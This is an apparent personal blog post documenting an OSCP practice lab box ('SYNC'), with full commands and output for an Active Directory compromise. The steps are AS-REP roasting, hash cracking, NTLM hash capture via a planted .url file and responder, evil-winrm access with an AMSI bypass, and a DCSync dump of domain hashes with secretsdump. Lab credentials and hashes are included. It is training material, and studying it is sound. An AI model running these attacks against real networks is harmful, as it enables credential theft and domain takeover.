---
layout: post
title:  "OSCP Preparation Day Four"
date:   2020-07-12 20:05:48 +0100
categories: oscp
---

Yikes. So I made a pretty crucial error and ended up losing all of todays work. This is devastating for me since I spent around 10 hours on it. This means that I'll spend tomorrow doing the content I did today...

Remember to backup your files before restoring to a snapshot! What a painful lesson to learn.

## SYNC

### NMAP
```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
```

### CRACKMAPEXEC
```
crackmapexec smb 172.31.3.6 -d sync.csl -u "corn" -p "" --rid-brute
SMB         172.31.3.6      445    SYNC             [*] Windows 10.0 Build 17763 x64 (name:SYNC) (domain:sync.csl) (signing:True) (SMBv1:False)
SMB         172.31.3.6      445    SYNC             [+] sync.csl\corn: 
SMB         172.31.3.6      445    SYNC             [+] Brute forcing RIDs
SMB         172.31.3.6      445    SYNC             498: SYNC0\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             500: SYNC0\Administrator (SidTypeUser)
SMB         172.31.3.6      445    SYNC             501: SYNC0\Guest (SidTypeUser)
SMB         172.31.3.6      445    SYNC             502: SYNC0\krbtgt (SidTypeUser)
SMB         172.31.3.6      445    SYNC             512: SYNC0\Domain Admins (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             513: SYNC0\Domain Users (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             514: SYNC0\Domain Guests (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             515: SYNC0\Domain Computers (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             516: SYNC0\Domain Controllers (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             517: SYNC0\Cert Publishers (SidTypeAlias)
SMB         172.31.3.6      445    SYNC             518: SYNC0\Schema Admins (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             519: SYNC0\Enterprise Admins (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             520: SYNC0\Group Policy Creator Owners (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             521: SYNC0\Read-only Domain Controllers (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             522: SYNC0\Cloneable Domain Controllers (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             525: SYNC0\Protected Users (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             526: SYNC0\Key Admins (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             527: SYNC0\Enterprise Key Admins (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             553: SYNC0\RAS and IAS Servers (SidTypeAlias)
SMB         172.31.3.6      445    SYNC             571: SYNC0\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         172.31.3.6      445    SYNC             572: SYNC0\Denied RODC Password Replication Group (SidTypeAlias)
SMB         172.31.3.6      445    SYNC             1000: SYNC0\SYNC$ (SidTypeUser)
SMB         172.31.3.6      445    SYNC             1101: SYNC0\DnsAdmins (SidTypeAlias)
SMB         172.31.3.6      445    SYNC             1102: SYNC0\DnsUpdateProxy (SidTypeGroup)
SMB         172.31.3.6      445    SYNC             1104: SYNC0\sysadmin (SidTypeUser)
SMB         172.31.3.6      445    SYNC             1107: SYNC0\manager (SidTypeUser)
SMB         172.31.3.6      445    SYNC             1109: SYNC0\clarke (SidTypeUser)
```

### KERBEROAST
```
GetNPUsers.py sync.csl/ -usersfile users
Impacket v0.9.22.dev1+20200605.133909.874d7ae4 - Copyright 2020 SecureAuth Corporation

[-] User sysadmin doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$manager@SYNC.CSL:6f26cec3b9f62d087258fba30275d6b1$c95708c19965a688dc4849e668b6751c8823afb277e81679d2cae985bc672ea3c322be7ae67d9b60510ec0be390a009c0a36d4a23274b4403ae73b2c8ceb4e3bc086361f039f02836172c390d54d8e4fd02d718599bd19ce889907a72f30903b190242556966a4c265c73d76e20d6595b6ad5e0ca1147d1c991f3f6b9f710e517eeea084b08d86d5d1f004b58ea312856382d93db7d5104645f81f92eef202f6cb767508494a8ae6decff718c17d384429f2ead0212a802438574f63ce5075208161ea6c1225e8e03e490a408296b7001c973f73c3eea1e23facc0a12c81bb54a4ff05c7
[-] User clarke doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Using hashcat we can crack this hash with a rule to get the password:
```
$krb5asrep$23$manager@SYNC.CSL:6d4d034e2959c2c0dcf3dd3361907c60$40287bc0ace23c57b21f1bb5b49efb279fef8b0a6c08c451a61113d431a503e57f96ee011116a21fbeda663d3165532502971fd5a11e979e14c23acf40053c18e178a33338ebd7be657ec7f30a887c6d344bc009f61facb8f42a5fcfcd3bac304d7d5d051db18f138abc5304c2975b32d1195e39eab4dbe510f8cae2c2d4e6eeabda8a06d53a6328031ec8553ea6f27bfb133722223dfec75490786e9a18b52ab88a6847139c88a1317b40cc10a2fecf5688ee0c95ee661e33ae0fc27d286259fc97d56ba0a7049dfb66790c079ac8f8db98bd5d6792689003cbcd7fb487f2fc019d3b5b:Brende11

Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos 5 AS-REP etype 23
Hash.Target......: $krb5asrep$23$manager@SYNC.CSL:6d4d034e2959c2c0dcf3...9d3b5b
Time.Started.....: Mon Jul 13 19:05:25 2020 (44 secs)
Time.Estimated...: Mon Jul 13 19:06:09 2020 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Mod........: Rules (rules/dive.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 46288.8 kH/s (6.47ms) @ Accel:32 Loops:16 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 2072207360/1421327930282 (0.15%)
Rejected.........: 0/2072207360 (0.00%)
Restore.Point....: 20480/14344387 (0.14%)
Restore.Sub.#1...: Salt:0 Amplifier:2080-2096 Iteration:0-16
Candidates.#1....: merlinade -> lrseo69
Hardware.Mon.#1..: Temp: 66c Fan: 39% Util: 97% Core:1923MHz Mem:3802MHz Bus:16
```
Now we have the credentials `manager:Brende11` and can see what new access we have.

### SMB

Checking SMB shares with new access:
```
python3 smbmap.py -H 172.31.3.6 -u "manager" -p "Brende11"
                   
[+] IP: 172.31.3.6:445	Name: sync.csl            	Status: Authenticated
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department                                        	READ, WRITE	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share
```

This took a WHILE for me to work out. I tried uploading a reverse shell to the box to see if someone would run it (as there didn't seem to be any other way) and I noticed that the file would be deleted every 1 min by AV. I came the think that there must be something or something checking the smb server for stuff. I tried possibly every way of getting a user to click on something I put up. I tried everything on this [list](https://ired.team/offensive-security/initial-access/t1187-forced-authentication) and more!

While doing this I was running the command `sudo responder -rf --lm -v -I tun0` which gave me no reply in any way. In hindsight, it's probably best to read the commands rather than copy/paste from the internet...
```
  --lm                  Force LM hashing downgrade for Windows XP/2003 and
                        earlier. Default: False
```
So I tried again without this option and started getting callbacks from the "link.url" file I uploaded.
```
[SMB] NTLMv2-SSP Client   : 172.31.3.6
[SMB] NTLMv2-SSP Username : SYNC0\sysadmin
[SMB] NTLMv2-SSP Hash     : sysadmin::SYNC0:1a0b291e1976417f:C9CC65A5DD6F97EA28C61F0EBD25B369:0101000000000000C0653150DE09D2014BF3B29FD9D8C549000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000003433CA5ABBB27F3BC7D8219E4836E9C7ADEBF975F31086B41E426FBFDC79E1430A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E0030002E0036003400000000000000000000000000
```
Next I cracked this hash with john to get the password of the user:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sEsshOUmArU25-159 (sysadmin)
1g 0:00:00:02 DONE (2020-07-13 22:35) 0.4784g/s 1950Kp/s 1950Kc/s 1950KC/s sa11kro94..s9poijtz
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Finally, we can use these credentials to get a shell on the box!
```
evil-winrm -i sync.csl -u sysadmin -p sEsshOUmArU25-159

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sysadmin\Documents>
```
Seriously, what a fun foothold for a machine. Was frustrating but fun in every step.

### PRIV ESC
First thing to do once we can log in, is check the output of bloodhound. As there is AV enabled on the box, we need to use the "Bypass-4MSI" module on evil-winrm. After using it, we will be able to run out ps1 scripts from evil-winrm with no issues.
```
*Evil-WinRM* PS C:\Users\sysadmin\Documents> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/ 
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers  
 
[+] Bypass-4MSI 
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary

*Evil-WinRM* PS C:\Users\sysadmin\Documents> Bypass-4MSI
[+] Patched! :D
```
From bloodhound we can see that the user we owned earlier "manager" has `GetChanges-All` privilege to the domain controller which means we can run a DCSync attack on the domain controller as this user.

Now we can use secretsdump to dump the hashes from the machine:
```
secretsdump.py -just-dc-ntlm sync.csl/manager:Brende11@172.31.3.6
Impacket v0.9.22.dev1+20200605.133909.874d7ae4 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a72e3fae34d37ec6f82d7f2c3a72bc04:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:82e8cd2033841359397d0e1c87a838d1:::
sync.csl\sysadmin:1104:aad3b435b51404eeaad3b435b51404ee:7ada8ad6d0c9cc85f815f4835a335771:::
sync.csl\manager:1107:aad3b435b51404eeaad3b435b51404ee:95188af0d722f36a46172c4f429ac340:::
sync.csl\clarke:1109:aad3b435b51404eeaad3b435b51404ee:afe866423686791e44eb89e48a4a0806:::
SYNC$:1000:aad3b435b51404eeaad3b435b51404ee:47fe146ce404b467f5ea8ff246cca824:::
[*] Cleaning up...
```
Now we have the password for the administrator we can do anything we like on the machine.

This priv esc is incredibly simple, but caused me to fall into some deep rabbit holes. I cannot say how many hours I spend trying to pivot to the "manager" account. I thought that the DCSync attack would require some kind of shell on the box to be able to work. 

In Bloodhound the output showed that the `sysadmin` user had `GenericWrite` privileges to the `manager` user. I must have learnt every single `GenericWrite` trick there is as aswell as trying every way of running a command as another user (For this reason i'm pretty glad that I spent so long on this). 

It was a fun box overall, even if the root was abit easier than the user.